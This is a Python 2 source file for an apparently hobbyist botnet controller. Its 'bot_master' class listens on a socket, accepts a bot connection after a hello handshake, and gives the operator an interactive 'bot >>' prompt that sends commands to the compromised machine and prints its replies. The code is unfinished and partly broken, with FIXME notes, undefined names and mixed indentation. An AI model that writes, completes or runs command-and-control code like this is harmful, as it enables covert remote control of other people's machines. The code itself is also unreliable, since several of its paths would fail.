#!/usr/bin/env python

import socket
import time
import sys

from common import *

MAX_BACKLOG = 4

class botlist:
  def __init__(self, conn, addr):
    self.conn = conn
    self.addr = addr


class bot_master:
  
  sock = None

  def __init__(self):
    self.botlist = []
    pass;
  
  def run(self, manually = False):
    if (self.start_listen() == False):
      return;

    #FIXME: there need to write some 
    # fork/exec functions
    D("[+] try to catch connections...");
    
    (conn, addr) = self.sock.accept()

    self.botlist.append(botlist(conn, addr))
    
    if self.hand_shake(conn) == False:
      self.conn.close();
      D("[-] hand shake fail, conn closed");
      return False;

    if (manually == True):
      self.get_cli(conn)
    else:
      print "write automatic functions plz"
      return False;

  def hand_shake(self, sock):
    sock.setblocking(1);

    try:  ack = sock.recv(PACK_SZ, socket.MSG_DONTWAIT)
    except Exception as err:  
      D('print "recv hello fail"');
      print err;
      return False;
    if ack != HELLO_MSG:
      D('[-] HELLO message incorrect ack = %s' % ack)
      return False;

    print "[+] ack recieved"
    sock.sendall(HELLO_ACK)
  
  def get_cli(self, sock):
    prev = sock.gettimeout()
    sock.settimeout(1.0)
    sock.sendall("get_cli\n");

    try:sock.recv(PACK_SZ, socket.MSG_DONTWAIT)
    except Exception as err:
      D("recv error");
      print err;
      return false;

    while True:
      D("next CLI iter");
      try:
        sys.stdout.write("bot >> ");
        
        ln = sys.stdin.readline();
	if ln == '\n':
		continue;

        sock.sendall(ln);
        print "msg send success"
	try:
	  ack = sock.recv(PACK_SZ);
        except socket.timeout:
	  D("Recv time out");
	  continue;

	print "recv success"
        
        if ack == "EXIT\n":
          break;
        print ack;
      except Exception as err:
        D("iter fail %s" % err);
        sock.settimeout(prev)
        return False;
    sock.settimeout(prev);
    pass;

  def start_listen(self):
    if self.sock != None:
      D("listening already inited...")
      return False;
    try:
      self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
    except:
      D("netbot init connection fail:(")
      print err;
      self.sock = None;
      return False;
    D("[+]socket.socket success")
    
    co = (SERV_IP, SERV_PORT)
    try: self.sock.bind(co);
    except Exception as err: 
      D("[-] socket.bind failed");
      print err;
      self.stop_listen();
      return False;
    D("[+]socket.bind success")

    self.sock.listen(MAX_BACKLOG)

    D("[+]socket.listen success")
    return True

  def stop_listen(self):
    if self.sock != None:
      self.sock.close()
    self.sock = None
    pass;
  
  def traverse(self, func):
    for bot in self.botlist:
      func(bot)

  def print_botlist(self):
    for bot in self.botlist:
      print "bot ip = %s port = %d" % (bot.addr[0], bot.addr[1])


def test_master():
  """
  simple testing routine
  """
  
  mymaster = bot_master()
  mymaster.run(manually = True)
  mymaster.print_botlist();
  
  del(mymaster)

if __name__ == "__main__":
  test_master()
